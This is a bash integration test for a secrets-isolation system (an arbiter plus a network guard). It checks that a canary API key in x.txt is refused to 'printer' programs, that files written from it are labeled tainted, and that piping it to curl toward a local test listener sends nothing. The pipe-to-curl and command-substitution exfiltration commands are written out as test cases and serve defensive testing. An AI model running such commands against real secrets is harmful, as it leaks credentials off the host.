#!/usr/bin/env bash
# pipe-taint-live.test.sh — confidentiality-plan-13 §4.5 live: a sink a
# reader already holds when it reads the secret. A real arbiter in mode
# `secrets` with a policy.yaml naming `python3`, `cat`, `curl`, `mdu-holder`
# (a reader the test builds, tests/lib/holder-reader.c, and pins by path and
# hash) and `mdu-catcopy` (a GNU cat renamed and pinned) as the readers of
# x.txt, the real mandu-net-guard with the launcher's secret policy file (the
# guard alone, the `gated` shape), real shells. The reader is `mdu-holder`:
# since plan 13 §8 decision (b) (2026-10-02) the bare `python3` entry admits
# nothing, and `python3 -c 'print(open(x).read())'`, this test's reader
# before, gets no byte; since plan 13 D8's "printers admit nothing"
# (2026-10-03) neither does `cat`, the reader until then, nor (the !437
# leftovers (1) and (2), the same day) `curl file://…` or a renamed copy of
# cat pinned by path and hash (each asserted below, under the real guard):
#   D5  `reader x.txt > out.txt`: the shell opens out.txt BEFORE the reader reads
#       x.txt; out.txt must take the derived label (the arbiter's
#       labelWrittenPathTainted, and pathLevel answers the level, which is
#       what the model exit masks a later read of out.txt by); a redirect from a
#       process that read nothing labels nothing (control).
#   D2  a pipeline's next stage is the reader's SIBLING: in
#       `reader x.txt | curl --data-binary @- http://127.0.0.3:P/` curl is
#       refused and the listener gets no byte of the secret; in
#       `reader x.txt | tee copy.txt` copy.txt is labeled; a command
#       substitution's shell (`x=$(reader); curl -d "$x" …`) is refused too.
#       Controls: the same curl fed by a process that read nothing reaches
#       the listener; `reader x.txt | grep API_KEY` still prints (masked at the
#       model exit, callTaint no-model, never blocked).
# SKIPs where python3 or the built guard are unavailable, or where the guard
# cannot install its listener (no seccomp user notification).
set -uo pipefail
REPO="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
PASS=0; FAIL=0
ok()  { echo "  ok — $1"; PASS=$((PASS+1)); }
bad() { echo "  NOT OK — $1"; FAIL=$((FAIL+1)); }
skip() { echo "pipe-taint-live.test.sh: SKIP ($1)"; echo "1 skipped, 0 failed"; exit 0; }
# A broken run, not a missing prerequisite (the dev arbiter did not come up,
# or refused the setup calls): FAIL with why and, given a log, its last
# lines; never SKIP, or a suite that went quiet shows green
# (scripts/lib/ready-deadline.sh).
# shellcheck source=scripts/lib/ready-deadline.sh
. "$REPO/scripts/lib/ready-deadline.sh"
abort() { echo "  NOT OK — $1"; if [[ -n "${2:-}" ]]; then mdu_log_tail "$2"; fi; echo "$PASS passed, $((FAIL + 1)) failed"; exit 1; }
# await_grep <grep args...>: grep until it matches, for up to 30 s (the
# arbiter logs asynchronously).
await_grep() { local i; for i in $(seq 1 300); do grep "$@" && return 0; sleep 0.1; done; grep "$@"; }
command -v python3 >/dev/null 2>&1 || skip "python3 not installed"
command -v curl >/dev/null 2>&1 || skip "curl not installed"
GUARD="$REPO/interceptors/target/release/mandu-net-guard"
[[ -x "$GUARD" ]] || GUARD="$REPO/interceptors/target/debug/mandu-net-guard"
[[ -x "$GUARD" ]] || skip "mandu-net-guard is not built (scripts/build-native.sh)"

WORK="$(mktemp -d "${TMPDIR:-/tmp}/mandu-pipe-taint.XXXXXX")"
cleanup() { "$REPO/scripts/dev-arbiter.sh" stop "$WORK/arb" 2>/dev/null; rm -rf "$WORK"; }
trap cleanup EXIT
# The runtime base (the instance registry, the human-plane socket): the
# suite's own, never the caller's $XDG_RUNTIME_DIR/mandu, also when the suite
# is killed; the lifeline (lib/lifeline.sh) ends the dev arbiter then, since
# `mandu reap` cannot see a registry here (test-organization.md §8.5).
export MANDU_RUNTIME_DIR="$WORK/rt"
source "$(dirname "${BASH_SOURCE[0]}")/lib/lifeline.sh"
mdu_lifeline_init "$WORK"

# The reader: a tiny reader the test builds (tests/lib/holder-reader.c,
# `mdu-holder FILE` prints FILE) and pins by path and hash (plan 13 D8: a
# printer by name admits nothing; a pin names one binary).
command -v cc >/dev/null 2>&1 || skip "no C compiler (cc) to build the pinned reader"
mkdir -p "$WORK/bin"
cc -O2 -o "$WORK/bin/mdu-holder" "$REPO/tests/lib/holder-reader.c" || skip "could not build the pinned reader"
HOLDER="$(readlink -f "$WORK/bin/mdu-holder")"; HSHA="$(sha256sum "$HOLDER" | cut -d' ' -f1)"
# The !437 leftover (2): a GNU cat (never the uutils multi-call binary,
# which picks its program from argv[0], so a renamed copy would not run as
# cat) copied under a name no printer has and pinned by path and hash is
# still cat, by its hash, and admits nothing. Empty where the host has none.
CATCOPY=""; CSHA=""
for c in /usr/bin/gnucat /bin/gnucat /usr/bin/cat /bin/cat; do
  [[ -e "$c" ]] || continue
  r="$(readlink -f "$c")"
  case "$r" in /usr/lib/cargo/*|*/busybox|*/toybox|*/coreutils) continue ;; esac
  cp "$r" "$WORK/bin/mdu-catcopy"; chmod 755 "$WORK/bin/mdu-catcopy"
  CATCOPY="$(readlink -f "$WORK/bin/mdu-catcopy")"; CSHA="$(sha256sum "$CATCOPY" | cut -d' ' -f1)"; break
done
CATCOPY_ENTRY=""; [[ -n "$CATCOPY" ]] && CATCOPY_ENTRY=", { app: mdu-catcopy, path: $CATCOPY, sha256: $CSHA }"

WS="$WORK/ws"; mkdir -p "$WS"
X="$WS/x.txt"; CANARY="PIPE_LIVE_CANARY_$RANDOM$RANDOM"
printf 'API_KEY=%s\n' "$CANARY" > "$X"
cat > "$WORK/policy.yaml" <<YAML
version: 1
paths:
  - path: $X
    level: no-model
    readers: [python3, cat, curl, { app: mdu-holder, path: $HOLDER, sha256: $HSHA, prints: nothing }$CATCOPY_ENTRY]   # python3, cat, curl and a renamed cat admit nothing (plan 13 §8 decision (b), D8); asserted below
YAML

mkdir -p "$WORK/arb"
# dev-arbiter.sh waits for both sockets on the shared readiness budget; a
# start that does not come up makes it say why, with its log's last lines,
# and exit non-zero: that FAILS this suite, never SKIPs it.
arb_env="$(MANDU_MODE=secrets MANDU_TENANT=test MANDU_POLICY_FILE="$WORK/policy.yaml" MANDU_LIFELINE_FIFO="$MANDU_LIFELINE_FIFO" "$REPO/scripts/dev-arbiter.sh" "$WORK/arb")" \
  || abort "the dev arbiter did not come up (dev-arbiter.sh exited $?; why and its log's last lines are above)"
eval "$(printf '%s\n' "$arb_env" | grep '^export ')"
SOCK="$MANDU_ARBITER_SOCK"
[[ -S "$SOCK" ]] || abort "dev-arbiter.sh reported up but $SOCK is no socket" "$WORK/arb/arbiter.log"
# One NDJSON request, its first answer line.
call() { python3 -c 'import socket,sys
s=socket.socket(socket.AF_UNIX); s.settimeout(10); s.connect(sys.argv[1]); s.sendall((sys.argv[2]+"\n").encode())
b=b""
while b"\n" not in b:
    c=s.recv(65536)
    if not c: break
    b+=c
print(b.split(b"\n")[0].decode())' "$SOCK" "$1" 2>/dev/null; }
json_field() { python3 -c 'import json,sys
j=json.loads(sys.stdin.read() or "{}"); v=(j.get("result") or {}).get(sys.argv[1])
print("" if v is None else v, end="")' "$1"; }

REG="$(call "{\"id\":1,\"op\":\"registerSecret\",\"path\":\"$X\"}")"
TWIN="$(printf '%s' "$REG" | json_field twin)"; SYM="$(printf '%s' "$REG" | json_field symbol)"
[[ -n "$SYM" ]] || { echo "$REG"; abort "the arbiter refused registerSecret" "$WORK/arb/arbiter.log"; }
mkdir -p "$WORK/twins"
if [[ -n "$TWIN" ]]; then printf '%s' "$TWIN" > "$WORK/twins/x"; else printf '%s\n' "$SYM" > "$WORK/twins/x"; fi
cat > "$WORK/secret-policy.json" <<JSON
{"agentExe":"","ask":"never","session":"pipe-live","unixDeny":["$WORK/rt/human"],"secrets":[
  {"path":"$X","twin":"$WORK/twins/x","level":"no-model"}]}
JSON
export MANDU_ARBITER_SOCK="$SOCK" MANDU_NET_GUARD_SECRETS="$WORK/secret-policy.json"
G=(mdu_without_lifeline "$GUARD" --allow "127.0.0.0/8:*" --)  # never holds the lifeline (lib/lifeline.sh)
READ_X="'$HOLDER' '$X'"

# the guard engages here at all (a reader gets the raw file through it)
OUT="$("${G[@]}" /bin/sh -c "$READ_X" 2>&1)"
[[ "$OUT" == *"$CANARY"* ]] || skip "the guard did not serve the raw file to its reader here: $(printf '%s' "$OUT" | tail -3)"
ok "control: mdu-holder, the pinned reader, gets the raw x.txt through the guard"
# plan 13 D8, printers admit nothing: cat is listed too, and gets no byte
OUT="$("${G[@]}" /bin/sh -c "cat '$X'; echo rc=\$?" 2>&1)"
[[ "$OUT" != *"$CANARY"* && "$OUT" != *"rc=0"* ]] \
  && ok "printers admit nothing: \`cat x.txt\` with cat listed gets no byte (refused: a printer is no reader)" \
  || bad "printers admit nothing: a listed cat read the file: $(printf '%s' "$OUT" | sed "s/$CANARY/<KEY>/g" | tail -3)"
await_grep -q "decideSecretOpen: $X by .*cat.* → deny (.*prints or copies" "$WORK/arb/arbiter.log" \
  && ok "printers admit nothing: the arbiter refused it, saying why" || bad "printers admit nothing: no refusal logged: $(grep -F 'decideSecretOpen' "$WORK/arb/arbiter.log" | tail -3)"
# the !437 leftover (1): curl, listed, prints any file it is pointed at
OUT="$("${G[@]}" /bin/sh -c "curl -q -s 'file://$X'; echo rc=\$?" 2>&1)"
[[ "$OUT" != *"$CANARY"* && "$OUT" != *"rc=0"* ]] \
  && ok "printers admit nothing: \`curl file://x.txt\` with curl listed gets no byte (curl is a printer)" \
  || bad "printers admit nothing: a listed curl printed the file: $(printf '%s' "$OUT" | sed "s/$CANARY/<KEY>/g" | tail -3)"
await_grep -q "decideSecretOpen: $X by .*curl.* → deny (.*prints or copies" "$WORK/arb/arbiter.log" \
  && ok "printers admit nothing: the arbiter refused curl, saying why" || bad "printers admit nothing: no curl refusal logged: $(grep -F 'decideSecretOpen' "$WORK/arb/arbiter.log" | tail -3)"
# the !437 leftover (2): a renamed copy of cat, pinned by path and hash
if [[ -n "$CATCOPY" ]]; then
  OUT="$("${G[@]}" /bin/sh -c "'$CATCOPY' '$X'; echo rc=\$?" 2>&1)"
  [[ "$OUT" != *"$CANARY"* && "$OUT" != *"rc=0"* ]] \
    && ok "printers admit nothing: a GNU cat renamed mdu-catcopy and pinned by path and hash gets no byte (its hash is cat's)" \
    || bad "printers admit nothing: a pinned renamed cat read the file: $(printf '%s' "$OUT" | sed "s/$CANARY/<KEY>/g" | tail -3)"
  await_grep -q "decideSecretOpen: $X by .*mdu-catcopy.* → deny (.*copy of a program that prints" "$WORK/arb/arbiter.log" \
    && ok "printers admit nothing: the arbiter refused the copy, naming it a printer's copy" || bad "printers admit nothing: no refusal of the copy logged: $(grep -F 'decideSecretOpen' "$WORK/arb/arbiter.log" | tail -3)"
else
  echo "  (no GNU cat on this host: the renamed-copy step is skipped)"
fi
# plan 13 §8 decision (b): python3 is listed too, but inline code is no reader
OUT="$("${G[@]}" /bin/sh -c "python3 -c 'print(open(\"$X\").read())'; echo rc=\$?" 2>&1)"
[[ "$OUT" != *"$CANARY"* && "$OUT" != *"rc=0"* ]] \
  && ok "decision (b): \`python3 -c 'open(x.txt)'\` with python3 listed gets no byte (refused: inline code is no reader)" \
  || bad "decision (b): inline python read the listed file: $(printf '%s' "$OUT" | sed "s/$CANARY/<KEY>/g" | tail -3)"
await_grep -q "decideSecretOpen: $X by .*python3.* → deny (.*pinned script" "$WORK/arb/arbiter.log" \
  && ok "decision (b): the arbiter refused it, naming the script pin" || bad "decision (b): no refusal logged: $(grep -F 'decideSecretOpen' "$WORK/arb/arbiter.log" | tail -3)"

level_of() { call "{\"id\":7,\"op\":\"pathLevel\",\"path\":\"$1\"}" | json_field level; }

# ── D5: the redirect opens the output before the read ───────────────────────
"${G[@]}" /bin/sh -c "$READ_X > '$WS/out.txt'" 2>/dev/null
grep -q "$CANARY" "$WS/out.txt" && ok "D5: the secret reached out.txt (the flow the label must follow)" || bad "D5: out.txt does not hold the secret: $(head -c 200 "$WS/out.txt")"
await_grep -q "labelWrittenPathTainted: $WS/out.txt .* → no-model" "$WORK/arb/arbiter.log" \
  && ok "D5: out.txt, opened by the shell before the reader read x.txt, got the derived label (no-model)" \
  || bad "D5: no derived label for out.txt; the arbiter's lines about $WS: $(grep -F "$WS" "$WORK/arb/arbiter.log" | tail -6)"
LV="$(level_of "$WS/out.txt")"
[[ "$LV" == "no-model" ]] && ok "D5: a later read of out.txt is judged at no-model (pathLevel: the model exit's mask for a read of out.txt)" || bad "D5: pathLevel(out.txt) = '$LV'"
# the same order one level down: a group redirect, the reader its child
"${G[@]}" /bin/sh -c "{ $READ_X; } > '$WS/group.txt'" 2>/dev/null
await_grep -q "labelWrittenPathTainted: $WS/group.txt .* → no-model" "$WORK/arb/arbiter.log" \
  && ok "D5: a group redirect (\`{ reader; } > group.txt\`) is labeled too" || bad "D5: group.txt unlabeled"
# control: the same redirect from a process that read nothing
"${G[@]}" /bin/sh -c "python3 -c 'print(1)' > '$WS/plain.txt'" 2>/dev/null
sleep 0.5
grep -q "labelWrittenPathTainted: $WS/plain.txt" "$WORK/arb/arbiter.log" && bad "D5 control: an untainted redirect was labeled" || ok "D5 control: an untainted redirect is not labeled"
LV="$(level_of "$WS/plain.txt")"
[[ "$LV" == "public" ]] && ok "D5 control: pathLevel(plain.txt) = public" || bad "D5 control: pathLevel(plain.txt) = '$LV'"

# ── D2: the bytes follow the pipe to a sibling ──────────────────────────────
LOG="$WORK/listener.log"; : > "$LOG"
python3 -c 'import socket,sys,threading
s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.bind(("127.0.0.3",0)); s.listen(16)
print(s.getsockname()[1], flush=True)
def serve(c):
    b=b""
    c.settimeout(5)
    try:
        while True:
            d=c.recv(65536)
            if not d: break
            b+=d
            if b"\r\n\r\n" in b and len(b) > 0:
                c.sendall(b"HTTP/1.0 200 OK\r\nContent-Length: 0\r\n\r\n")
    except Exception: pass
    open(sys.argv[1],"ab").write(b+b"\n--\n"); c.close()
while True:
    c,_=s.accept(); threading.Thread(target=serve,args=(c,),daemon=True).start()' "$LOG" > "$WORK/port" &
LST=$!
for _ in $(seq 1 50); do [[ -s "$WORK/port" ]] && break; sleep 0.1; done
P="$(cat "$WORK/port")"
CURL="curl --noproxy '*' -s -o /dev/null --max-time 5"
# control first: a curl fed by a process that read nothing reaches the listener
OUT="$("${G[@]}" /bin/sh -c "echo PIPE_LIVE_CONTROL | $CURL --data-binary @- http://127.0.0.3:$P/; echo rc=\$?" 2>&1)"
sleep 0.3
grep -q PIPE_LIVE_CONTROL "$LOG" && ok "D2 control: \`echo … | curl\` reaches the listener (127.0.0.3 is allowed to an untainted process)" || bad "D2 control: the listener got nothing: $OUT"
OUT="$("${G[@]}" /bin/sh -c "$READ_X | $CURL --data-binary @- http://127.0.0.3:$P/; echo rc=\$?" 2>&1)"
sleep 0.3
if grep -q "$CANARY" "$LOG"; then bad "D2: \`reader x.txt | curl\` delivered the secret to an unbound host"; else ok "D2: \`reader x.txt | curl --data-binary @-\` sends no byte of the secret (curl, the reader's sibling, is a holder)"; fi
[[ "$OUT" != *"rc=0"* ]] && ok "D2: that curl fails (its connect refused)" || bad "D2: curl reported success: $OUT"
OUT="$("${G[@]}" /bin/bash -c "x=\$($READ_X); $CURL -d \"\$x\" http://127.0.0.3:$P/; echo rc=\$?" 2>&1)"
sleep 0.3
if grep -q "$CANARY" "$LOG"; then bad "D2: a command substitution's shell sent the secret"; else ok "D2: \`x=\$(reader); curl -d \"\$x\"\` sends nothing (the shell reading the substitution is a holder)"; fi
"${G[@]}" /bin/sh -c "$READ_X | tee '$WS/copy.txt' >/dev/null" 2>/dev/null
grep -q "$CANARY" "$WS/copy.txt" && ok "D2: the secret reached copy.txt through tee" || bad "D2: copy.txt: $(head -c 100 "$WS/copy.txt")"
await_grep -q "labelWrittenPathTainted: $WS/copy.txt .* → no-model" "$WORK/arb/arbiter.log" \
  && ok "D2: \`reader x.txt | tee copy.txt\` labels copy.txt (no-model)" \
  || bad "D2: copy.txt unlabeled; the arbiter's lines about $WS: $(grep -F "$WS" "$WORK/arb/arbiter.log" | tail -6)"
LV="$(level_of "$WS/copy.txt")"
[[ "$LV" == "no-model" ]] && ok "D2: pathLevel(copy.txt) = no-model" || bad "D2: pathLevel(copy.txt) = '$LV'"
# utility: `reader x | grep` still prints (masked at the model exit, not blocked)
OUT="$("${G[@]}" /bin/sh -c "$READ_X | grep API_KEY" 2>&1)"; RC=$?
[[ "$OUT" == *"$CANARY"* && "$RC" == 0 ]] && ok "D2 utility: \`reader x.txt | grep API_KEY\` still prints (grep, now a holder, is not blocked)" || bad "D2 utility: reader | grep got (rc=$RC): $OUT"
CT="$(call "{\"id\":11,\"op\":\"callTaint\",\"callId\":\"toolu_pipe_grep\",\"command\":\"'$HOLDER' '$X' | grep API_KEY\",\"session\":\"pipe-live\"}")"
[[ "$CT" == *'"level":"no-model"'* ]] && ok "D2 utility: callTaint finds the call's taint (the model exit masks the output, as before)" || bad "D2 utility: callTaint: $CT"
kill "$LST" 2>/dev/null

# the real file is intact
grep -q "$CANARY" "$X" && ok "the real x.txt is intact" || bad "x.txt changed"

echo "$PASS passed, $FAIL failed"
[[ $FAIL -eq 0 ]]
